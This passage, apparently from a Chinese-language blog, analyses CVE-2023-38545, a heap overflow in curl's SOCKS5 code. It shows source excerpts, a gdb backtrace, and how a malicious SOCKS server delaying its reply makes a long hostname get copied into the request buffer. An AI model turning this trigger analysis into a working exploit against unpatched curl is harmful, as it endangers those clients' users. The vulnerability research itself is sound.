&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> sx&lt;span style="color:#f92672">-&amp;gt;&lt;/span>outp &lt;span style="color:#f92672">=&lt;/span> socksreq; &lt;span style="color:#75715e">/* store it here */&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#75715e">/* FALLTHROUGH */&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#66d9ef">case&lt;/span> CONNECT_SOCKS_READ:
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> presult &lt;span style="color:#f92672">=&lt;/span> &lt;span style="color:#a6e22e">socks_state_recv&lt;/span>(cf, sx, data, CURLPX_RECV_CONNECT,
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#e6db74">&amp;#34;initial SOCKS5 response&amp;#34;&lt;/span>);
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#66d9ef">if&lt;/span>(CURLPX_OK &lt;span style="color:#f92672">!=&lt;/span> presult)
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#66d9ef">return&lt;/span> presult;
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#66d9ef">else&lt;/span> &lt;span style="color:#a6e22e">if&lt;/span>(sx&lt;span style="color:#f92672">-&amp;gt;&lt;/span>outstanding) {
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#75715e">/* remain in reading state */&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#66d9ef">return&lt;/span> CURLPX_OK;
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> }
&lt;/span>&lt;/span>&lt;/code>&lt;/pre>&lt;/div>&lt;p>读取数据时，其调用栈如下&lt;/p>
&lt;div class="highlight">&lt;pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;">&lt;code class="language-c" data-lang="c">&lt;span style="display:flex;">&lt;span>gef&lt;span style="color:#960050;background-color:#1e0010">➤&lt;/span> bt
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>&lt;span style="color:#75715e">#0 cf_socket_recv (cf=0x5555555e6a28, data=0x5555555e6ef8, buf=0x5555555ddb48 &amp;#34;\005\001&amp;#34;, len=0x2, err=0x7fffffffb3a4) at cf-socket.c:1352
&lt;/span>&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>&lt;span style="color:#75715e">#1 0x00007ffff7ed5d95 in Curl_cf_def_recv (cf=0x5555555e63e8, data=0x5555555e6ef8, buf=0x5555555ddb48 &amp;#34;\005\001&amp;#34;, len=0x2, err=0x7fffffffb3a4) at cfilters.c:100
&lt;/span>&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>&lt;span style="color:#75715e">#2 0x00007ffff7ed6762 in Curl_conn_cf_recv (cf=0x5555555e63e8, data=0x5555555e6ef8, buf=0x5555555ddb48 &amp;#34;\005\001&amp;#34;, len=0x2, err=0x7fffffffb3a4) at cfilters.c:328
&lt;/span>&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>&lt;span style="color:#75715e">#3 0x00007ffff7f4839a in socks_state_recv (cf=0x5555555e6428, sx=0x5555555e6468, data=0x5555555e6ef8, failcode=CURLPX_RECV_CONNECT, description=0x7ffff7f82254 &amp;#34;initial SOCKS5 response&amp;#34;) at socks.c:241
&lt;/span>&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>&lt;span style="color:#75715e">#4 0x00007ffff7f49274 in do_SOCKS5 (cf=0x5555555e6428, sx=0x5555555e6468, data=0x5555555e6ef8) at socks.c:646
&lt;/span>&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>&lt;span style="color:#75715e">#5 0x00007ffff7f4a137 in connect_SOCKS (cf=0x5555555e6428, sxstate=0x5555555e6468, data=0x5555555e6ef8) at socks.c:1067
&lt;/span>&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>&lt;span style="color:#75715e">#6 0x00007ffff7f4a3f1 in socks_proxy_cf_connect (cf=0x5555555e6428, data=0x5555555e6ef8, blocking=0x0, done=0x7fffffffb667) at socks.c:1149
&lt;/span>&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>&lt;span style="color:#75715e">#7 0x00007ffff7ed6635 in Curl_conn_cf_connect (cf=0x5555555e6428, data=0x5555555e6ef8, blocking=0x0, done=0x7fffffffb667) at cfilters.c:296
&lt;/span>&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>&lt;span style="color:#75715e">#8 0x00007ffff7edaa4d in cf_setup_connect (cf=0x5555555e6348, data=0x5555555e6ef8, blocking=0x0, done=0x7fffffffb667) at connect.c:1201
&lt;/span>&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>&lt;span style="color:#75715e">#9 0x00007ffff7ed68a1 in Curl_conn_connect (data=0x5555555e6ef8, sockindex=0x0, blocking=0x0, done=0x7fffffffb667) at cfilters.c:351
&lt;/span>&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>&lt;span style="color:#75715e">#10 0x00007ffff7f276b7 in multi_runsingle (multi=0x5555555dd868, nowp=0x7fffffffb6f0, data=0x5555555e6ef8) at multi.c:2106
&lt;/span>&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>&lt;span style="color:#75715e">#11 0x00007ffff7f28d94 in curl_multi_perform (multi=0x5555555dd868, running_handles=0x7fffffffb754) at multi.c:2742
&lt;/span>&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>&lt;span style="color:#75715e">#12 0x00007ffff7eeb1e6 in easy_transfer (multi=0x5555555dd868) at easy.c:682
&lt;/span>&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>&lt;span style="color:#75715e">#13 0x00007ffff7eeb3d4 in easy_perform (data=0x5555555e6ef8, events=0x0) at easy.c:772
&lt;/span>&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>&lt;span style="color:#75715e">#14 0x00007ffff7eeb40c in curl_easy_perform (data=0x5555555e6ef8) at easy.c:791
&lt;/span>&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>&lt;span style="color:#75715e">#15 0x000055555557a1f3 in serial_transfers (global=0x7fffffffb900, share=0x5555555d9f08) at tool_operate.c:2479
&lt;/span>&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>&lt;span style="color:#75715e">#16 0x000055555557a7c1 in run_all_transfers (global=0x7fffffffb900, share=0x5555555d9f08, result=CURLE_OK) at tool_operate.c:2670
&lt;/span>&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>&lt;span style="color:#75715e">#17 0x000055555557ab6c in operate (global=0x7fffffffb900, argc=0x7, argv=0x7fffffffba98) at tool_operate.c:2786
&lt;/span>&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>&lt;span style="color:#75715e">#18 0x00005555555710f8 in main (argc=0x7, argv=0x7fffffffba98) at tool_main.c:274
&lt;/span>&lt;/span>&lt;/span>&lt;/code>&lt;/pre>&lt;/div>&lt;p>让我们把代码放在一起看，在do_SOCKS5函数中，将 &lt;code>sx-&amp;gt;outstanding&lt;/code>赋值为2，尝试调用 &lt;code>socks_state_recv&lt;/code>从TCP sock中读取两个字节的数据，经过层层调用最终进入到 &lt;code>nw_in_read&lt;/code>函数中，调用recv函数从sock中读取数据。&lt;/p>
&lt;div class="highlight">&lt;pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;">&lt;code class="language-c" data-lang="c">&lt;span style="display:flex;">&lt;span>presult &lt;span style="color:#f92672">=&lt;/span> &lt;span style="color:#a6e22e">socks_state_recv&lt;/span>(cf, sx, data, CURLPX_RECV_CONNECT,
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#e6db74">&amp;#34;initial SOCKS5 response&amp;#34;&lt;/span>);
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#66d9ef">if&lt;/span>(CURLPX_OK &lt;span style="color:#f92672">!=&lt;/span> presult)
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#66d9ef">return&lt;/span> presult;
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#66d9ef">else&lt;/span> &lt;span style="color:#a6e22e">if&lt;/span>(sx&lt;span style="color:#f92672">-&amp;gt;&lt;/span>outstanding) {
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#75715e">/* remain in reading state */&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#66d9ef">return&lt;/span> CURLPX_OK;
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> }
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>&lt;span style="color:#66d9ef">static&lt;/span> CURLproxycode &lt;span style="color:#a6e22e">socks_state_recv&lt;/span>(&lt;span style="color:#66d9ef">struct&lt;/span> Curl_cfilter &lt;span style="color:#f92672">*&lt;/span>cf,
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>.....
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>{
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#66d9ef">ssize_t&lt;/span> nread;
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> CURLcode result;
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> nread &lt;span style="color:#f92672">=&lt;/span> &lt;span style="color:#a6e22e">Curl_conn_cf_recv&lt;/span>(cf&lt;span style="color:#f92672">-&amp;gt;&lt;/span>next, data, (&lt;span style="color:#66d9ef">char&lt;/span> &lt;span style="color:#f92672">*&lt;/span>)sx&lt;span style="color:#f92672">-&amp;gt;&lt;/span>outp,
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> sx&lt;span style="color:#f92672">-&amp;gt;&lt;/span>outstanding, &lt;span style="color:#f92672">&amp;amp;&lt;/span>result);
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>......
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> sx&lt;span style="color:#f92672">-&amp;gt;&lt;/span>outstanding &lt;span style="color:#f92672">-=&lt;/span> nread;
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#66d9ef">return&lt;/span> CURLPX_OK;
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>}
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>&lt;span style="color:#66d9ef">ssize_t&lt;/span> &lt;span style="color:#a6e22e">Curl_conn_cf_recv&lt;/span>(&lt;span style="color:#66d9ef">struct&lt;/span> Curl_cfilter &lt;span style="color:#f92672">*&lt;/span>cf, &lt;span style="color:#66d9ef">struct&lt;/span> Curl_easy &lt;span style="color:#f92672">*&lt;/span>data,
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>{
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#66d9ef">if&lt;/span>(cf)
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#66d9ef">return&lt;/span> cf&lt;span style="color:#f92672">-&amp;gt;&lt;/span>cft&lt;span style="color:#f92672">-&amp;gt;&lt;/span>&lt;span style="color:#a6e22e">do_recv&lt;/span>(cf, data, buf, len, err);
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#f92672">*&lt;/span>err &lt;span style="color:#f92672">=&lt;/span> CURLE_RECV_ERROR;
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#66d9ef">return&lt;/span> &lt;span style="color:#f92672">-&lt;/span>&lt;span style="color:#ae81ff">1&lt;/span>;
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>}
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>&lt;span style="color:#66d9ef">static&lt;/span> &lt;span style="color:#66d9ef">ssize_t&lt;/span> &lt;span style="color:#a6e22e">cf_socket_recv&lt;/span>(&lt;span style="color:#66d9ef">struct&lt;/span> Curl_cfilter &lt;span style="color:#f92672">*&lt;/span>cf, &lt;span style="color:#66d9ef">struct&lt;/span> Curl_easy &lt;span style="color:#f92672">*&lt;/span>data,
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#66d9ef">char&lt;/span> &lt;span style="color:#f92672">*&lt;/span>buf, &lt;span style="color:#66d9ef">size_t&lt;/span> len, CURLcode &lt;span style="color:#f92672">*&lt;/span>err)
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>{
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#66d9ef">struct&lt;/span> cf_socket_ctx &lt;span style="color:#f92672">*&lt;/span>ctx &lt;span style="color:#f92672">=&lt;/span> cf&lt;span style="color:#f92672">-&amp;gt;&lt;/span>ctx;
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#66d9ef">curl_socket_t&lt;/span> fdsave;
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#66d9ef">ssize_t&lt;/span> nread;
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#f92672">*&lt;/span>err &lt;span style="color:#f92672">=&lt;/span> CURLE_OK;
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> fdsave &lt;span style="color:#f92672">=&lt;/span> cf&lt;span style="color:#f92672">-&amp;gt;&lt;/span>conn&lt;span style="color:#f92672">-&amp;gt;&lt;/span>sock[cf&lt;span style="color:#f92672">-&amp;gt;&lt;/span>sockindex];
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> cf&lt;span style="color:#f92672">-&amp;gt;&lt;/span>conn&lt;span style="color:#f92672">-&amp;gt;&lt;/span>sock[cf&lt;span style="color:#f92672">-&amp;gt;&lt;/span>sockindex] &lt;span style="color:#f92672">=&lt;/span> ctx&lt;span style="color:#f92672">-&amp;gt;&lt;/span>sock;
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>......
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#66d9ef">else&lt;/span> {
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> nread &lt;span style="color:#f92672">=&lt;/span> &lt;span style="color:#a6e22e">nw_in_read&lt;/span>(&lt;span style="color:#f92672">&amp;amp;&lt;/span>rctx, (&lt;span style="color:#66d9ef">unsigned&lt;/span> &lt;span style="color:#66d9ef">char&lt;/span> &lt;span style="color:#f92672">*&lt;/span>)buf, len, err);
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>......
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#66d9ef">return&lt;/span> nread;
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>}
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>&lt;span style="color:#66d9ef">static&lt;/span> &lt;span style="color:#66d9ef">ssize_t&lt;/span> &lt;span style="color:#a6e22e">nw_in_read&lt;/span>(&lt;span style="color:#66d9ef">void&lt;/span> &lt;span style="color:#f92672">*&lt;/span>reader_ctx,
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#66d9ef">unsigned&lt;/span> &lt;span style="color:#66d9ef">char&lt;/span> &lt;span style="color:#f92672">*&lt;/span>buf, &lt;span style="color:#66d9ef">size_t&lt;/span> len,
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> CURLcode &lt;span style="color:#f92672">*&lt;/span>err)
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>{
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#66d9ef">struct&lt;/span> reader_ctx &lt;span style="color:#f92672">*&lt;/span>rctx &lt;span style="color:#f92672">=&lt;/span> reader_ctx;
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#66d9ef">struct&lt;/span> cf_socket_ctx &lt;span style="color:#f92672">*&lt;/span>ctx &lt;span style="color:#f92672">=&lt;/span> rctx&lt;span style="color:#f92672">-&amp;gt;&lt;/span>cf&lt;span style="color:#f92672">-&amp;gt;&lt;/span>ctx;
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#66d9ef">ssize_t&lt;/span> nread;
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#f92672">*&lt;/span>err &lt;span style="color:#f92672">=&lt;/span> CURLE_OK;
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> nread &lt;span style="color:#f92672">=&lt;/span> &lt;span style="color:#a6e22e">sread&lt;/span>(ctx&lt;span style="color:#f92672">-&amp;gt;&lt;/span>sock, buf, len);
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>......
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#66d9ef">return&lt;/span> nread;
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>}
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>&lt;span style="color:#75715e">#define sread(x,y,z) (ssize_t)recv((RECV_TYPE_ARG1)(x), \
&lt;/span>&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>&lt;span style="color:#75715e"> (RECV_TYPE_ARG2)(y), \
&lt;/span>&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>&lt;span style="color:#75715e"> (RECV_TYPE_ARG3)(z), \
&lt;/span>&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>&lt;span style="color:#75715e"> (RECV_TYPE_ARG4)(0))
&lt;/span>&lt;/span>&lt;/span>&lt;/code>&lt;/pre>&lt;/div>&lt;p>根据RFC1928，服务器会在客户端发送hello包之后返回，选择通信方法后返回server hello
client hello
&lt;img alt="" src="https://www.ch35tnut.site/images/vulnerability/CVE-2023-38545-curl-heap-overflow.zh-cn.assets/2.png" />
server hello
&lt;img alt="" src="https://www.ch35tnut.site/images/vulnerability/CVE-2023-38545-curl-heap-overflow.zh-cn.assets/3.png" />&lt;/p>
&lt;p>正常情况下，socks服务器返回server hello之后，socks_state_recv读取了两个字节的数据并通过 &lt;code>sx-&amp;gt;outstanding -= nread;&lt;/code>使得outstanding=0，之后在状态机内会继续处理socks连接。&lt;/p>
&lt;p>但如果攻击者可控socks服务器，并强迫在服务器在client 发送hello之后，过了client 设置的sock timeout在返回数据包的话会怎么样？
recv函数如果在setsockopt设置的超时时间内还没有从TCP连接读取到数据的话，则会返回-1，并且err被设置为CURLE_AGAIN ，在 &lt;code>socks_state_recv&lt;/code>函数中因为读取到的nread=-1，所以这个函数返回CURLPX_OK。&lt;/p>
&lt;p>返回到状态机中，presult=CURLPX_OK，sx-&amp;gt;outstanding=2，do_SOCKS5函数返回CURLPX_OK，因为没读数据，所以在easy.c中会继续循环。&lt;/p>
&lt;div class="highlight">&lt;pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;">&lt;code class="language-c" data-lang="c">&lt;span style="display:flex;">&lt;span>&lt;span style="color:#66d9ef">static&lt;/span> CURLcode &lt;span style="color:#a6e22e">easy_transfer&lt;/span>(&lt;span style="color:#66d9ef">struct&lt;/span> Curl_multi &lt;span style="color:#f92672">*&lt;/span>multi)
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>{
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#66d9ef">bool&lt;/span> done &lt;span style="color:#f92672">=&lt;/span> FALSE;
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> CURLMcode mcode &lt;span style="color:#f92672">=&lt;/span> CURLM_OK;
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> CURLcode result &lt;span style="color:#f92672">=&lt;/span> CURLE_OK;
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#66d9ef">while&lt;/span>(&lt;span style="color:#f92672">!&lt;/span>done &lt;span style="color:#f92672">&amp;amp;&amp;amp;&lt;/span> &lt;span style="color:#f92672">!&lt;/span>mcode) {
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#66d9ef">int&lt;/span> still_running &lt;span style="color:#f92672">=&lt;/span> &lt;span style="color:#ae81ff">0&lt;/span>;
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> mcode &lt;span style="color:#f92672">=&lt;/span> &lt;span style="color:#a6e22e">curl_multi_poll&lt;/span>(multi, NULL, &lt;span style="color:#ae81ff">0&lt;/span>, &lt;span style="color:#ae81ff">1000&lt;/span>, NULL);
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#66d9ef">if&lt;/span>(&lt;span style="color:#f92672">!&lt;/span>mcode)
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> mcode &lt;span style="color:#f92672">=&lt;/span> &lt;span style="color:#a6e22e">curl_multi_perform&lt;/span>(multi, &lt;span style="color:#f92672">&amp;amp;&lt;/span>still_running);
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#75715e">/* only read &amp;#39;still_running&amp;#39; if curl_multi_perform() return OK */&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#66d9ef">if&lt;/span>(&lt;span style="color:#f92672">!&lt;/span>mcode &lt;span style="color:#f92672">&amp;amp;&amp;amp;&lt;/span> &lt;span style="color:#f92672">!&lt;/span>still_running) {
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#66d9ef">int&lt;/span> rc;
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> CURLMsg &lt;span style="color:#f92672">*&lt;/span>msg &lt;span style="color:#f92672">=&lt;/span> &lt;span style="color:#a6e22e">curl_multi_info_read&lt;/span>(multi, &lt;span style="color:#f92672">&amp;amp;&lt;/span>rc);
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#66d9ef">if&lt;/span>(msg) {
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> result &lt;span style="color:#f92672">=&lt;/span> msg&lt;span style="color:#f92672">-&amp;gt;&lt;/span>data.result;
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> done &lt;span style="color:#f92672">=&lt;/span> TRUE;
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> }
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> }
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> }
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#75715e">/* Make sure to return some kind of error if there was a multi problem */&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#66d9ef">if&lt;/span>(mcode) {
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> result &lt;span style="color:#f92672">=&lt;/span> (mcode &lt;span style="color:#f92672">==&lt;/span> CURLM_OUT_OF_MEMORY) &lt;span style="color:#f92672">?&lt;/span> CURLE_OUT_OF_MEMORY :
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#75715e">/* The other multi errors should never happen, so return
&lt;/span>&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>&lt;span style="color:#75715e"> something suitably generic */&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> CURLE_BAD_FUNCTION_ARGUMENT;
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> }
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#66d9ef">return&lt;/span> result;
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>}
&lt;/span>&lt;/span>&lt;/code>&lt;/pre>&lt;/div>&lt;p>此时socks服务器返回数据的话，再次进入到do_SOCKS5函数，此时在函数开头socks5_resolve_local=false，进入到状态机中，由于此时状态不再是CONNECT_SOCKS_INIT，所以socks5_resolve_local不会被设置为true，此时在状态CONNECT_REQ_INIT时，状态机会跳转到状态CONNECT_RESOLVE_REMOTE，也就是curl尝试让socks服务器进行DNS解析并请求。&lt;/p>
&lt;div class="highlight">&lt;pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;">&lt;code class="language-c" data-lang="c">&lt;span style="display:flex;">&lt;span>&lt;span style="color:#66d9ef">unsigned&lt;/span> &lt;span style="color:#66d9ef">char&lt;/span> &lt;span style="color:#f92672">*&lt;/span>socksreq &lt;span style="color:#f92672">=&lt;/span> (&lt;span style="color:#66d9ef">unsigned&lt;/span> &lt;span style="color:#66d9ef">char&lt;/span> &lt;span style="color:#f92672">*&lt;/span>)data&lt;span style="color:#f92672">-&amp;gt;&lt;/span>state.buffer;
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>&lt;span style="color:#66d9ef">const&lt;/span> &lt;span style="color:#66d9ef">size_t&lt;/span> hostname_len &lt;span style="color:#f92672">=&lt;/span> &lt;span style="color:#a6e22e">strlen&lt;/span>(sx&lt;span style="color:#f92672">-&amp;gt;&lt;/span>hostname);
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>CONNECT_RESOLVE_REMOTE:
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#66d9ef">case&lt;/span> CONNECT_RESOLVE_REMOTE:
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#75715e">/* Authentication is complete, now specify destination to the proxy */&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> len &lt;span style="color:#f92672">=&lt;/span> &lt;span style="color:#ae81ff">0&lt;/span>;
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> socksreq[len&lt;span style="color:#f92672">++&lt;/span>] &lt;span style="color:#f92672">=&lt;/span> &lt;span style="color:#ae81ff">5&lt;/span>; &lt;span style="color:#75715e">/* version (SOCKS5) */&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> socksreq[len&lt;span style="color:#f92672">++&lt;/span>] &lt;span style="color:#f92672">=&lt;/span> &lt;span style="color:#ae81ff">1&lt;/span>; &lt;span style="color:#75715e">/* connect */&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> socksreq[len&lt;span style="color:#f92672">++&lt;/span>] &lt;span style="color:#f92672">=&lt;/span> &lt;span style="color:#ae81ff">0&lt;/span>; &lt;span style="color:#75715e">/* must be zero */&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#66d9ef">if&lt;/span>(&lt;span style="color:#f92672">!&lt;/span>socks5_resolve_local) {
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>......
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#a6e22e">memcpy&lt;/span>(&lt;span style="color:#f92672">&amp;amp;&lt;/span>socksreq[len], sx&lt;span style="color:#f92672">-&amp;gt;&lt;/span>hostname, hostname_len); &lt;span style="color:#75715e">/* w/o NULL */&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>......
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> }
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#75715e">/* FALLTHROUGH */&lt;/span>
&lt;/span>&lt;/span>&lt;/code>&lt;/pre>&lt;/div>&lt;p>此时curl会尝试将主机名通过memcpy拷贝到tcp 请求体中，而socksreq指向的内存由Curl_preconnect分配&lt;/p>
&lt;div class="highlight">&lt;pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;">&lt;code class="language-c" data-lang="c">&lt;span style="display:flex;">&lt;span>CURLcode &lt;span style="color:#a6e22e">Curl_preconnect&lt;/span>(&lt;span style="color:#66d9ef">struct&lt;/span> Curl_easy &lt;span style="color:#f92672">*&lt;/span>data)
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>{
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>  &lt;span style="color:#66d9ef">if&lt;/span>(&lt;span style="color:#f92672">!&lt;/span>data&lt;span style="color:#f92672">-&amp;gt;&lt;/span>state.buffer) {
